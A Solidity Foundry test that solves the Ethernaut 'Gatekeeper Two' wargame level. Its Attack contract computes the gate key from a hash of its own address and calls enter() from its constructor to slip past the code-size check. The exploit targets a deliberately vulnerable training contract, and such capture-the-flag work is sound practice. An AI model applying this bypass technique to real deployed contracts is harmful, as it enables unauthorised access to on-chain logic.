// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/GatekeeperTwo/GatekeeperTwoFactory.sol";
import "../src/Ethernaut.sol";

contract GatekeeperTwoTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testGatekeeperTwoHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        GatekeeperTwoFactory gatekeeperTwoFactory = new GatekeeperTwoFactory();
        ethernaut.registerLevel(gatekeeperTwoFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperTwoFactory);
        GatekeeperTwo ethernautGatekeeperTwo = GatekeeperTwo(payable(levelAddress));
        vm.stopPrank();

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        new Attack(address(ethernautGatekeeperTwo));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        vm.startPrank(tx.origin);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    GatekeeperTwo gatekeeperTwo;

    constructor(address _gatekeeperTwo) {
        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
        uint64 key;
        key = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max;
        gatekeeperTwo.enter(bytes8(key));
    }
}
